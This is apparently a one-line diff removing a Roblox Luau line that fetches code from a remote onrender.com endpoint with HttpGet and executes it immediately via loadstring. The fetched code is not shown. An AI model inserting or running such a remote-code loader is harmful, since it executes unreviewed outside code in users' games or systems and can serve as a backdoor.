@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://luaumor-ousi.onrender.com/api/files/c13b49db4da04e2d81fb59c915db9bad"))()
